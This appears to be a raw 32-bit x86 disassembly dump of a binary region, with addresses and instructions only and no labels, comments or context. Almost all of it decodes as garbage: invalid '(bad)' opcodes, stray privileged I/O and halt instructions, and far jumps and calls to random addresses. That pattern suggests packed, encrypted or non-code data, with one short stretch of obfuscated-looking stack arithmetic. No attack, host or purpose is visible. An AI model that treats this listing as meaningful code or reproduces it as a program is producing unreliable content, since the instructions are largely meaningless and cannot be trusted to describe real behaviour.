  414461:	cld    
  414462:	(bad)  
  414463:	jecxz  0x41447a
  414465:	icebp  
  414466:	loope  0x4144b7
  414468:	into   
  414469:	into   
  41446a:	adc    eax,0xde6a32bc
  41446f:	outs   dx,DWORD PTR ds:[esi]
  414470:	jecxz  0x4144bf
  414472:	push   eax
  414473:	neg    edi
  414475:	jae    0x41446e
  414477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414478:	sti    
  414479:	test   eax,0x452e054a
  41447e:	jo     0x4144ba
  414480:	inc    esp
  414481:	inc    ebp
  414482:	and    eax,0xc2966dbf
  414487:	push   ebx
  414488:	daa    
  414489:	pop    ds
  41448a:	ds aad 0x5c
  41448d:	push   0x50
  41448f:	add    BYTE PTR [edi-0x7c],al
  414492:	and    edx,edx
  414494:	jmp    0x41441a
  414496:	test   DWORD PTR [esi+ecx*2],esp
  414499:	retf   0x20c4
  41449c:	or     eax,0x119a7b3e
  4144a1:	jge    0x41445b
  4144a3:	jg     0x414518
  4144a5:	or     BYTE PTR [ebp-0x26c69fe3],dl
  4144ab:	push   edx
  4144ac:	int    0x58
  4144ae:	pusha  
  4144af:	lds    ecx,FWORD PTR [esi-0x60]
  4144b2:	add    DWORD PTR ds:0x4783b633,esi
  4144b8:	inc    ebp
  4144b9:	mov    ds:0x30d16705,eax
  4144be:	cmp    eax,0xffc337a0
  4144c3:	(bad)  
  4144c4:	enter  0xb86c,0x3a
  4144c8:	sub    eax,0x61a727ed
  4144cd:	mov    al,ds:0x6ae0e43b
  4144d2:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4144d4:	dec    esp
  4144d5:	xor    al,0x3d
  4144d7:	ret    
  4144d8:	add    DWORD PTR [edi+eiz*2+0x411a3043],ecx
  4144df:	and    edx,DWORD PTR [esi+0x13403ac3]
  4144e5:	and    al,0xfb
  4144e7:	test   DWORD PTR [ecx+0x47],eax
  4144ea:	mov    al,0x12
  4144ec:	mov    eax,0x2f62eeb3
  4144f1:	xchg   ecx,eax
  4144f2:	sbb    al,0xdd
  4144f4:	xchg   esp,eax
  4144f5:	pop    ebx
  4144f6:	lock mov ecx,0x2ce800cb
  4144fc:	mov    WORD PTR [ebx+0x1587de4b],gs
  414502:	test   eax,0xe3195f75
  414507:	sahf   
  414508:	(bad)  
  414509:	sbb    eax,0x9c246aa7
  41450e:	jecxz  0x41453c
  414510:	(bad)  
  414511:	mov    ds:0x52f2add5,al
  414516:	scas   al,BYTE PTR es:[edi]
  414517:	das    
  414518:	push   cs
  414519:	enter  0xd66d,0xeb
  41451d:	jp     0x414505
  41451f:	sbb    esi,edx
  414521:	pop    esi
  414522:	pop    eax
  414523:	ret    0x4f4f
  414526:	cmp    al,0x83
  414528:	lahf   
  414529:	enter  0x3d77,0x78
  41452d:	jge    0x4144b8
  41452f:	cs ffreep st(1)
  414532:	test   edx,edx
  414534:	mov    eax,0x5b4a084f
  414539:	dec    ecx
  41453a:	repz cli 
  41453c:	jo     0x4144c9
  41453e:	xchg   edi,eax
  41453f:	fidivr DWORD PTR [ecx-0x76]
  414542:	or     eax,0x9113feab
  414547:	jnp    0x414560
  414549:	loopne 0x4144fd
  41454b:	loope  0x4145b8
  41454d:	jae    0x414536
  41454f:	mov    ebx,DWORD PTR [esp+ebx*1-0x22]
  414553:	push   ebp
  414554:	mov    edi,0x8a75f396
  414559:	pop    ds
  41455a:	xor    eax,0xdeea9e6
  41455f:	and    DWORD PTR [edx+edi*8],ebx
  414562:	mov    ebx,0xf7495e54
  414567:	les    esp,FWORD PTR [ecx-0x7c691022]
  41456d:	aam    0x8c
  41456f:	iret   
  414570:	hlt    
  414571:	fidivr WORD PTR [edi-0x35]
  414574:	inc    ebx
  414575:	addr16 mov ebp,ebx
  414578:	xor    al,0xdd
  41457a:	inc    esp
  41457b:	or     DWORD PTR [eax],ebx
  41457d:	mov    dh,0x2
  41457f:	xchg   esp,eax
  414580:	xchg   DWORD PTR ds:0x99949faf,edx
  414586:	(bad)  
  414589:	pop    eax
  41458a:	or     DWORD PTR [ebp+0x55],ebp
  41458d:	jbe    0x414578
  41458f:	inc    edi
  414590:	mov    dh,0xd0
  414592:	inc    esi
  414593:	add    DWORD PTR [edx+0x2e11dcef],ebp
  414599:	pop    ebp
  41459a:	cmp    cl,BYTE PTR [eax]
  41459c:	xor    eax,0xcc88bf75
  4145a1:	and    ebx,DWORD PTR [ecx+0x5d]
  4145a4:	mov    WORD PTR [eax],gs
  4145a6:	(bad)  
  4145a7:	cmp    eax,0x74af8969
  4145ac:	mov    cl,0xf1
  4145ae:	jl     0x414617
  4145b0:	jmp    0x42cf7d7d
  4145b5:	xchg   ebx,eax
  4145b6:	cmp    dl,BYTE PTR [edi+0x79]
  4145b9:	adc    bl,BYTE PTR [edx-0x3bb2a842]
  4145bf:	jle    0x41458b
  4145c1:	test   DWORD PTR [ebp-0x4a],esp
  4145c4:	js     0x414638
  4145c6:	inc    ebx
  4145c7:	loop   0x4145ec
  4145c9:	scas   eax,DWORD PTR es:[edi]
  4145ca:	cs jne 0x4145b2
  4145cd:	sub    eax,0xba9eb7b2
  4145d2:	sub    edx,edi
  4145d4:	fs xor al,0x50
  4145d7:	sahf   
  4145d8:	cmp    al,0x90
  4145da:	not    DWORD PTR [edi]
  4145dc:	jmp    0x414572
  4145de:	add    esp,DWORD PTR [ecx]
  4145e0:	and    eax,0xbecfcc0d
  4145e5:	sbb    BYTE PTR [ecx+0x293081b6],ah
  4145eb:	ins    DWORD PTR es:[edi],dx
  4145ec:	in     eax,0x4
  4145ee:	(bad)  
  4145ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f0:	adc    al,0x82
  4145f2:	xchg   edi,eax
  4145f3:	dec    esi
  4145f4:	stos   BYTE PTR es:[edi],al
  4145f5:	aam    0x71
  4145f7:	sub    eax,0xd78c1274
  4145fc:	aaa    
  4145fd:	push   ss
  4145fe:	jge    0x41464c
  414600:	mov    al,ds:0x81c3483
  414605:	jns    0x414662
  414607:	adc    eax,0xcb9a4ebb
  41460c:	pop    esp
  41460d:	and    BYTE PTR [ebx+eiz*4],0x6d
  414611:	push   ecx
  414612:	sar    BYTE PTR [esi+0x8bfa837],cl
  414618:	stos   DWORD PTR es:[edi],eax
  414619:	in     al,0xc3
  41461b:	inc    eax
  41461c:	or     dh,BYTE PTR [ecx-0x52]
  41461f:	(bad)  
  414621:	daa    
  414622:	repz std 
  414624:	jge    0x4145f7
  414626:	je     0x4145cd
  414628:	icebp  
  414629:	mov    edi,DWORD PTR ds:0x545c38c
  41462f:	in     eax,dx
  414630:	mov    bl,0x49
  414632:	out    dx,eax
  414633:	mov    ds:0xc8d9e905,al
  414638:	mov    bh,BYTE PTR [edx]
  41463a:	pop    es
  41463b:	mov    esi,0x2483fcca
  414640:	pop    ss
  414641:	sub    BYTE PTR [ecx],al
  414643:	mov    al,ds:0xb0e0da3a
  414648:	xor    dl,BYTE PTR [esi-0x60]
  41464b:	test   al,0xda
  41464d:	cmp    al,0xaa
  41464f:	icebp  
  414650:	or     eax,0x339bc1a
  414655:	jg     0x4145fb
  414657:	mov    al,ds:0xf3e080f
  41465c:	scas   eax,DWORD PTR es:[edi]
  41465d:	xlat   BYTE PTR ds:[ebx]
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	add    BYTE PTR [esi+0x42],0xd1
  414675:	test   al,0xae
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x41466f
  41467f:	mov    edx,0x3b1ac02d
  414684:	leave  
  414685:	mov    eax,ds:0x6d506e22
  41468a:	jp     0x41462e
  41468c:	mov    al,ds:0x8b84574f
  414691:	iret   
  414692:	pop    es
  414693:	inc    ebp
  414694:	push   esp
  414695:	dec    esi
  414696:	adc    ebp,DWORD PTR [eax+0x62408f1b]
  41469c:	sub    eax,0xec91354a
  4146a1:	jle    0x414720
  4146a3:	repz popa 
  4146a5:	mov    edx,0xfac1b8f7
  4146aa:	sahf   
  4146ab:	scas   eax,DWORD PTR es:[edi]
  4146ac:	lods   eax,DWORD PTR ds:[esi]
  4146ad:	xor    BYTE PTR [eax+0x26adf41],al
  4146b3:	pusha  
  4146b4:	loope  0x414695
  4146b6:	mov    esp,0x7be4e051
  4146bb:	aad    0xda
  4146bd:	lods   al,BYTE PTR ds:[esi]
  4146be:	pushf  
  4146bf:	fstp   TBYTE PTR [edx+0x72]
  4146c2:	lods   al,BYTE PTR ds:[esi]
  4146c3:	std    
  4146c4:	jecxz  0x4146d4
  4146c6:	mov    edx,0xf701720
  4146cb:	sahf   
  4146cc:	pop    edi
  4146cd:	repnz push ss
  4146cf:	mov    WORD PTR [esi+0x5d4ede39],es
  4146d5:	sbb    edi,ebp
  4146d7:	hlt    
  4146d8:	aaa    
  4146d9:	jmp    0x414668
  4146db:	sbb    bl,al
  4146dd:	popa   
  4146de:	mov    esp,0x7f52805d
  4146e3:	adc    eax,0xaa2a888b
  4146e8:	push   0xffffffa0
  4146ea:	xchg   ecx,eax
  4146eb:	push   0x9d4ac3ba
  4146f0:	pop    ecx
  4146f1:	repz test DWORD PTR [ecx],0x4497503e
  4146f8:	mov    ebp,0x620ffa75
  4146fd:	(bad)  
  4146fe:	dec    ebp
  4146ff:	loopne 0x414732
  414701:	add    BYTE PTR [esi+0x50],cl
  414704:	shl    DWORD PTR [edi],cl
  414706:	add    eax,0x3264862
  41470b:	xchg   ecx,eax
  41470c:	dec    ebp
  41470d:	leave  
  41470e:	stos   BYTE PTR es:[edi],al
  41470f:	adc    BYTE PTR [edx],ch
  414711:	pop    esp
  414712:	xchg   DWORD PTR [ecx+0x6b15b808],edx
  414718:	sbb    DWORD PTR [eax+edx*2],0xffffff80
  41471c:	mov    ah,0xa1
  41471e:	push   esp
  41471f:	shl    ebp,0xcf
  414722:	dec    edx
  414723:	xchg   ebx,eax
  414724:	cwde   
  414725:	loop   0x4146f7
  414727:	test   DWORD PTR [ecx+0x3057fce6],0x43fcefa
  414731:	lahf   
  414732:	icebp  
  414733:	ins    DWORD PTR es:[edi],dx
  414734:	mov    WORD PTR [ecx-0x2c],fs
  414737:	test   edx,0xe3e9771a
  41473d:	ins    BYTE PTR es:[edi],dx
  41473e:	push   0x7f123144
  414743:	pushf  
  414744:	inc    ecx
  414745:	dec    edi
  414746:	push   ebx
  414747:	sahf   
  414748:	das    
  414749:	aam    0x37
  41474b:	daa    
  41474c:	js     0x414701
  41474e:	mov    bl,0x60
  414750:	and    DWORD PTR ds:0x345dad49,ecx
  414756:	lods   al,BYTE PTR ds:[esi]
  414757:	push   0x804d3bd6
  41475c:	sbb    DWORD PTR [esp+esi*2-0x6c],esp
  414760:	inc    edi
  414761:	lods   eax,DWORD PTR ds:[esi]
  414762:	mov    edx,0xdb9f5831
  414767:	je     0x414793
  414769:	repnz xor dh,BYTE PTR [ecx]
  41476c:	add    ebx,DWORD PTR ds:0x6e56d98d
  414772:	out    0x2d,al
  414774:	xor    DWORD PTR [eax+0x5d],0xffffff90
  414778:	mov    eax,ds:0x60ff6bd6
  41477d:	cmp    eax,0xd860e468
  414782:	int    0x27
  414784:	aad    0xc0
  414786:	xchg   edx,eax
  414787:	test   eax,0x661226de
  41478c:	imul   edi,DWORD PTR ds:0x816f2d2e,0x7fe67976
  414796:	test   BYTE PTR [ecx+0xfef7b34],0x16
  41479d:	retf   
  41479e:	mov    ds:0xd0c9bb50,al
  4147a3:	jmp    0x41476f
  4147a5:	or     DWORD PTR [ecx-0x5d77ca8b],esi
  4147ab:	mov    al,0xa4
  4147ad:	pusha  
  4147ae:	inc    esi
  4147af:	fld    QWORD PTR [edx+0x47]
  4147b2:	mov    ebx,DWORD PTR [edx-0x2fa57dd4]
  4147b8:	call   DWORD PTR [edx+0x38372c27]
  4147be:	or     edx,DWORD PTR [eax-0x296bf218]
  4147c4:	push   0x94a92edd
  4147c9:	cmc    
  4147ca:	mov    eax,ds:0x235d7491
  4147cf:	ins    BYTE PTR es:[edi],dx
  4147d0:	dec    ecx
  4147d1:	adc    cl,BYTE PTR [edx-0x2a]
  4147d4:	inc    bh
  4147d6:	and    ch,BYTE PTR [esi]
  4147d8:	loopne 0x4147a2
  4147da:	jge    0x414769
  4147dc:	popa   
  4147dd:	inc    edi
  4147de:	in     al,dx
  4147df:	mov    ds:0x9cb5a052,eax
  4147e4:	repz sahf 
  4147e6:	jb     0x4147c2
  4147e8:	and    BYTE PTR [eax+esi*1],dh
  4147eb:	fcom   st(6)
  4147ed:	aaa    
  4147ee:	xor    edi,DWORD PTR [eax-0x72]
  4147f1:	and    DWORD PTR [esi],edx
  4147f3:	add    esi,esi
  4147f5:	repz sub dl,BYTE PTR [ebx-0x56]
  4147f9:	dec    edi
  4147fa:	stc    
  4147fb:	test   eax,0x947bccd1
  414800:	ficomp WORD PTR [edx-0x78]
  414803:	add    eax,0xa74fb413
  414808:	sbb    al,0xa8
  41480a:	mov    dh,al
  41480c:	ficom  DWORD PTR [edx-0x36]
  41480f:	xchg   esi,eax
  414810:	pop    ss
  414811:	leave  
  414812:	dec    ebp
  414813:	push   esp
  414814:	lds    ebp,FWORD PTR [ecx+0x35ac9ccd]
  41481a:	jae    0x414805
  41481c:	pushf  
  41481d:	push   edi
  41481e:	stos   DWORD PTR es:[edi],eax
  41481f:	sub    ch,bl
  414821:	jno    0x414813
  414823:	jmp    0x851f:0x89b39340
  41482a:	sbb    edi,esi
  41482c:	push   ds
  41482d:	and    eax,0xf4282f4e
  414832:	dec    ebx
  414833:	jle    0x4148b4
  414835:	ins    BYTE PTR es:[edi],dx
  414836:	mov    dl,0x8a
  414838:	inc    esp
  414839:	jle    0x4147f3
  41483b:	sbb    esi,DWORD PTR [ebx]
  41483d:	xor    BYTE PTR [ebx+0x4ab5a25d],dl
  414843:	mov    DWORD PTR [edi],ebx
  414845:	ss add bl,ah
  414848:	imul   dl
  41484a:	loop   0x4148aa
  41484c:	jb     0x4147fb
  41484e:	jg     0x414848
  414850:	push   ss
  414851:	dec    ecx
  414852:	int    0x38
  414854:	shr    ah,1
  414856:	lea    ebx,[esi]
  414858:	pop    ss
  414859:	xchg   DWORD PTR [edx],esi
  41485b:	(bad)  
  41485c:	fcomp  QWORD PTR [ebp+0x14911853]
  414862:	jno    0x4148de
  414864:	add    eax,0xe70c9a00
  414869:	or     bh,ah
  41486b:	daa    
  41486c:	cmp    BYTE PTR [esp+esi*4-0x18c6ce88],cl
  414873:	xchg   esp,eax
  414874:	fwait
  414875:	mov    dl,0xbe
  414877:	pop    edi
  414878:	or     eax,0xa631551e
  41487d:	(bad)  
  41487e:	out    dx,al
  41487f:	xor    al,0x8a
  414881:	les    ebp,FWORD PTR [esi]
  414883:	in     eax,0xec
  414885:	cli    
  414886:	mov    ebx,0x468b25c8
  41488b:	loope  0x414908
  41488d:	mov    al,0x6e
  41488f:	push   esi
  414890:	and    eax,0x8d741860
  414895:	mov    al,ds:0x49172f8f
  41489a:	xor    eax,edx
  41489c:	add    DWORD PTR [edx-0x333492ca],esi
  4148a2:	add    esp,DWORD PTR [edx-0x58]
  4148a5:	jl     0x4148cd
  4148a7:	(bad)  
  4148a8:	lds    esp,FWORD PTR [ebp-0x6f78d017]
  4148ae:	ror    WORD PTR [ecx-0x60218938],cl
  4148b5:	or     edi,DWORD PTR [edx+0x8]
  4148b8:	xchg   edi,eax
  4148b9:	inc    ecx
  4148ba:	ret    0x907b
  4148bd:	shr    BYTE PTR [esi+ebx*4+0xf310827],0x65
  4148c5:	enter  0x79c9,0xd3
  4148c9:	pop    eax
  4148ca:	add    eax,edx
  4148cc:	pop    ecx
  4148cd:	sar    DWORD PTR [edx-0x2a3915e0],0xf2
  4148d4:	xchg   ebp,eax
  4148d5:	into   
  4148d6:	xchg   ebp,eax
  4148d7:	cmp    eax,ebx
  4148d9:	cmp    BYTE PTR [ecx-0x2b],cl
  4148dc:	es je  0x41491d
  4148df:	sbb    DWORD PTR [ecx-0x29b2a3c4],esp
  4148e5:	adc    eax,0x33959ca9
  4148ea:	clc    
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax-0x33d87ab5]
  414921:	fldcw  WORD PTR [esi-0x7]
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x4148f0
  41492d:	enter  0x5d35,0x2e
  414931:	xor    cl,BYTE PTR [ebx+0x13]
  414934:	push   esp
  414935:	and    esi,DWORD PTR [edx]
  414937:	pop    esi
  414938:	(bad)  ds:0x3b051ddc
  41493e:	xchg   edi,eax
  41493f:	xchg   esi,eax
  414940:	pop    esi
  414941:	arpl   si,bx
  414943:	jge    0x414910
  414945:	retf   0xcf48
  414948:	(bad)  
  414949:	fwait
  41494a:	jns    0x4148e0
  41494c:	add    DWORD PTR [edx],edx
  41494e:	inc    edx
  41494f:	enter  0x880f,0x1e
  414953:	aaa    
  414954:	ins    DWORD PTR es:[edi],dx
  414955:	mov    ch,0x78
  414957:	sub    DWORD PTR [ecx],edx
  414959:	cmp    edi,DWORD PTR [ebx+0x61]
  41495c:	push   ds
  41495d:	cmp    al,0x20
  41495f:	mov    bl,BYTE PTR [ecx-0x63dcd4fa]
  414965:	push   edx
  414966:	test   eax,0x8e76960
  41496b:	repz mov ah,0xfb
  41496e:	push   es
  41496f:	mov    WORD PTR [eax+0xbac1a8e],ds
  414975:	jmp    0x24ba6eed
  41497a:	into   
  41497b:	jb     0x41490f
  41497d:	push   ecx
  41497e:	sbb    eax,0x39136d64
  414983:	pop    esi
  414984:	add    eax,0xf327de4d
  414989:	pop    ebx
  41498a:	repz pop ss
  41498c:	ds loopne 0x4149d5
  41498f:	jo     0x41495a
  414991:	cs jmp 0x54e7d97c
  414997:	xchg   ecx,eax
  414998:	adc    al,0xd8
  41499a:	cdq    
  41499b:	mov    ebp,0x86cdc169
  4149a0:	adc    eax,0xaf7a30a6
  4149a5:	loopne 0x414a1d
  4149a7:	dec    ebp
  4149a8:	cwde   
  4149a9:	jb     0x41497f
  4149ab:	push   es
  4149ac:	ja     0x414a21
  4149ae:	cmp    eax,0x52a01a7e
  4149b3:	and    eax,0x1366fd79
  4149b8:	inc    edi
  4149b9:	mov    dh,0x3a
  4149bb:	mov    bl,0x88
  4149bd:	repz adc ax,WORD PTR [ebp-0x2e]
  4149c2:	jle    0x414994
  4149c4:	fdivr  QWORD PTR [eax]
  4149c6:	arpl   WORD PTR [esi],di
  4149c8:	jbe    0x414a3a
  4149ca:	shl    BYTE PTR [ebx],cl
  4149cc:	mov    ds:0xdc8afaae,eax
  4149d1:	loope  0x4149ae
  4149d3:	test   eax,0xff56d4f2
  4149d8:	mov    ss,edi
  4149da:	ret    
  4149db:	int    0x6f
  4149dd:	or     al,0xf7
  4149df:	dec    ecx
  4149e0:	in     al,dx
  4149e1:	in     al,dx
  4149e2:	xlat   BYTE PTR ds:[ebx]
  4149e3:	jno    0x414990
  4149e5:	mov    edx,eax
  4149e7:	test   DWORD PTR [esi],0x980da770
  4149ed:	push   es
  4149ee:	jmp    0xd4af2ead
  4149f3:	stos   DWORD PTR es:[edi],eax
  4149f4:	push   es
  4149f5:	loop   0x414a07
  4149f7:	sar    DWORD PTR [edi],0x63
  4149fa:	dec    eax
  4149fb:	or     cl,BYTE PTR [edx+0x2b2b671b]
  414a01:	and    edi,eax
  414a03:	nop
  414a04:	les    ebp,FWORD PTR [si]
  414a07:	mov    ds:0xaeb51d16,eax
  414a0c:	add    BYTE PTR es:[eiz*1+0x91c5a17],0x5d
  414a15:	xchg   ebp,eax
  414a16:	jg     0x4149d5
  414a18:	or     DWORD PTR [edx-0x22],0x618a9eaa
  414a1f:	and    al,0xc2
  414a21:	jo     0x414a33
  414a23:	and    ah,BYTE PTR [edi+0x128feb44]
  414a29:	in     al,dx
  414a2a:	daa    
  414a2b:	push   cs
  414a2c:	push   edx
  414a2d:	loop   0x414a0e
  414a2f:	popf   
  414a30:	out    0xb2,eax
  414a32:	pop    ss
  414a33:	xchg   edx,eax
  414a34:	imul   edi,edx,0x2d917e2c
  414a3a:	in     al,dx
  414a3b:	stc    
  414a3c:	dec    ecx
  414a3d:	dec    esp
  414a3e:	call   FWORD PTR [eax-0x1199719a]
  414a44:	test   DWORD PTR [eax+0x397d1361],esp
  414a4a:	mov    esp,0x68e7434c
  414a4f:	xor    bl,BYTE PTR [eax]
  414a51:	sub    edi,DWORD PTR [edi-0x3c132539]
  414a57:	scas   al,BYTE PTR es:[edi]
  414a58:	pop    edx
  414a59:	lock retf 
  414a5b:	add    al,0xcf
  414a5d:	outs   dx,BYTE PTR ds:[esi]
  414a5e:	dec    dx
  414a60:	jne    0x414a15
  414a62:	jp     0x414a49
  414a64:	pop    ss
  414a65:	fdiv   QWORD PTR [edx+0x7f75bcae]
  414a6b:	repz cmp edi,DWORD PTR [ebp+esi*1+0xeb88c14]
  414a73:	repz fdiv QWORD PTR [eax-0x3b]
  414a77:	adc    al,bl
  414a79:	xor    DWORD PTR [edi+0x3de8aac1],esp
  414a7f:	and    BYTE PTR [edi-0x8641ec2],dh
  414a85:	inc    ebp
  414a86:	out    dx,eax
  414a87:	inc    eax
  414a88:	hlt    
  414a89:	sbb    eax,0x6cf5f73
  414a8e:	xor    al,0xaf
  414a90:	lea    esp,[edi-0x877b39d]
  414a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a97:	lds    esp,FWORD PTR [edi]
  414a99:	cmp    cl,BYTE PTR [edx-0x19]
  414a9c:	mov    BYTE PTR cs:0xd3393a,dl
  414aa3:	xor    bh,BYTE PTR [ecx]
  414aa5:	mov    bh,0x1f
  414aa7:	lock sbb al,BYTE PTR [ecx]
  414aaa:	inc    eax
  414aab:	cmp    BYTE PTR [ebx],ah
  414aad:	stc    
  414aae:	sub    eax,0xca48a1c4
  414ab3:	fdivr  st(1),st
  414ab5:	mov    edi,0x3b52c0ec
  414aba:	mov    BYTE PTR [eax],bh
  414abc:	adc    DWORD PTR [edx+0x1e52376b],ecx
  414ac2:	mov    edi,0x6567d5e
  414ac7:	icebp  
  414ac8:	cwde   
  414ac9:	imul   eax,DWORD PTR ds:0xf9904ad7,0x3a
  414ad0:	lahf   
  414ad1:	cmp    al,BYTE PTR [ebx-0x37]
  414ad4:	ins    DWORD PTR es:[edi],dx
  414ad5:	sbb    al,0x32
  414ad7:	call   0x6dcb:0x18e4765d
  414ade:	push   eax
  414adf:	je     0x414af5
  414ae1:	enter  0xf9fa,0x4e
  414ae5:	jp     0x414add
  414ae7:	sub    DWORD PTR [ebp+0x15c9b473],esi
  414aed:	jg     0x414b3f
  414aef:	mov    edi,0x1008c5cc
  414af4:	lods   al,BYTE PTR ds:[esi]
  414af5:	add    edi,ecx
  414af7:	xor    ecx,DWORD PTR [eax+edx*2+0x51d1d5e8]
  414afe:	push   esi
  414aff:	jl     0x414b05
  414b01:	and    eax,edi
  414b03:	bound  ebx,QWORD PTR [ecx-0x2a]
  414b06:	stos   BYTE PTR es:[edi],al
  414b07:	ds (bad) 
  414b09:	out    0xb,al
  414b0b:	retf   0x7f05
  414b0e:	inc    ebp
  414b0f:	pop    esi
  414b10:	push   0x61
  414b12:	jle    0x414af9
  414b14:	inc    edx
  414b15:	cmp    bh,BYTE PTR [edx+ecx*8-0x15]
  414b19:	mov    cl,0x85
  414b1b:	das    
  414b1c:	mov    ecx,0x571a4f63
  414b21:	inc    edi
  414b22:	js     0x414b75
  414b24:	push   DWORD PTR [si]
  414b27:	push   edi
  414b28:	in     eax,0x4f
  414b2a:	adc    ecx,esi
  414b2c:	mov    esi,ebx
  414b2e:	mov    esi,0x45ede705
  414b33:	or     DWORD PTR [edi],edi
  414b35:	pop    eax
  414b36:	ret    0x67aa
  414b39:	push   edi
  414b3a:	mov    esi,0x5cb1dce3
  414b3f:	mov    ecx,0x31a40bc0
  414b44:	call   0x5cf5:0x948e65aa
  414b4b:	cmc    
  414b4c:	mov    bl,0xe9
  414b4e:	adc    ecx,esp
  414b50:	sbb    BYTE PTR [ecx],0xf8
  414b53:	pop    es
  414b54:	sahf   
  414b55:	lods   eax,DWORD PTR ds:[esi]
  414b56:	jp     0x414b9e
  414b58:	sbb    ebx,ecx
  414b5a:	into   
  414b5b:	aam    0x13
  414b5d:	and    cl,BYTE PTR [esi-0x46]
  414b60:	pop    edx
  414b62:	daa    
  414b63:	or     al,0x85
  414b65:	lahf   
  414b66:	imul   ebp,DWORD PTR [edi],0xc232a71
  414b6c:	cmova  esi,DWORD PTR [ecx]
  414b6f:	add    BYTE PTR [esi-0x544ea47c],dl
  414b75:	cmp    edi,DWORD PTR [esi-0x2b0fc89e]
  414b7b:	mov    ds,WORD PTR [edi]
  414b7d:	push   es
  414b7e:	sub    ecx,DWORD PTR [eax]
  414b80:	or     ecx,ecx
  414b82:	iret   
  414b83:	cmc    
  414b84:	xchg   BYTE PTR [eax],dl
  414b86:	rcl    DWORD PTR ds:0x47ade0e1,cl
  414b8c:	jnp    0x414b7b
  414b8e:	in     al,0x92
  414b90:	cmc    
  414b91:	mov    bh,0xc6
  414b93:	mov    al,ds:0x33b74295
  414b98:	rol    BYTE PTR [ebx],1
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	test   eax,0x808e8ae3
  414bb6:	adc    bh,BYTE PTR [edi+0x78]
  414bb9:	in     eax,0x7e
  414bbb:	js     0x414c35
  414bbd:	in     al,dx
  414bbe:	(bad)  
  414bbf:	or     esi,DWORD PTR [eax-0x536dea04]
  414bc5:	cmc    
  414bc6:	cwde   
  414bc7:	clc    
  414bc8:	stc    
  414bc9:	out    dx,al
  414bca:	xor    eax,0xdac99c6e
  414bcf:	or     eax,0x77b03cd
  414bd4:	pop    ecx
  414bd5:	pusha  
  414bd6:	fxch   st(5)
  414bd8:	shr    BYTE PTR [ecx-0x56],1
  414bdb:	sub    eax,0x52848570
  414be0:	mov    ds:0xa74cfdce,al
  414be5:	ins    BYTE PTR es:[edi],dx
  414be6:	call   0x22a8:0x749b57a2
  414bed:	or     dl,BYTE PTR [edi+ebp*2+0xc]
  414bf1:	jb     0x414bbb
  414bf3:	and    BYTE PTR cs:[ecx],0x61
  414bf7:	xor    dh,bh
  414bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bfa:	xchg   al,bh
  414bfc:	mov    DWORD PTR [ebx-0x50],ebx
  414bff:	jbe    0x414b95
  414c01:	mov    ebx,0xcfa8dba
  414c06:	push   ebp
  414c07:	lds    eax,FWORD PTR [ebx+0x45]
  414c0a:	pusha  
  414c0b:	aaa    
  414c0c:	sub    DWORD PTR [eax],eax
  414c0e:	push   si
  414c10:	call   0x6b96a266
  414c15:	push   esi
  414c16:	cmp    esp,DWORD PTR [ebp+esi*2-0x16e2a7f7]
  414c1d:	in     al,dx
  414c1e:	add    eax,DWORD PTR [eax+0x599011a5]
  414c24:	push   es
  414c25:	stc    
  414c26:	in     eax,0xe7
  414c28:	aam    0xde
  414c2a:	lock (bad) es:[eax]
  414c2e:	not    cl
  414c30:	(bad)  
  414c31:	jne    0x414bd4
  414c33:	mov    al,ds:0xebd735a5
  414c38:	lea    esi,[edi-0x6a]
  414c3b:	pop    ecx
  414c3c:	mov    edx,0x6b2569f
  414c41:	nop
  414c42:	add    BYTE PTR [edx+0x4cf857d3],bh
  414c48:	mov    ds:0x34de1fb6,eax
  414c4d:	icebp  
  414c4e:	mov    dh,0xe4
  414c50:	jnp    0x414c80
  414c52:	mov    cl,0xb
  414c54:	ror    BYTE PTR [ebx+0x26],cl
  414c57:	push   edi
  414c58:	call   0xf99f:0x4bb323bf
  414c5f:	jg     0x414cac
  414c61:	jae    0x414c90
  414c63:	fld    TBYTE PTR [ebx+eax*1+0x3]
  414c67:	mov    ebx,0x8bf98a70
  414c6c:	and    eax,0xc737f880
  414c71:	cwde   
  414c72:	fidiv  DWORD PTR [eax-0x15]
  414c75:	inc    eax
  414c76:	idiv   BYTE PTR [edx-0xd]
  414c79:	clc    
  414c7a:	mov    BYTE PTR [ebp+0x1cc91f4a],ah
  414c80:	or     edx,ebp
  414c82:	add    DWORD PTR [ebx+0x5fd8f338],esp
  414c88:	lds    ebp,FWORD PTR [edi+0x32]
  414c8b:	dec    eax
  414c8c:	mov    WORD PTR [edi+0xbb5ebac],fs
  414c92:	mov    esi,0x62496897
  414c97:	and    eax,0x4dc12cf4
  414c9c:	mov    ah,0x5c
  414c9e:	mov    WORD PTR [esi],?
  414ca0:	icebp  
  414ca1:	arpl   WORD PTR [ecx+0xe],bp
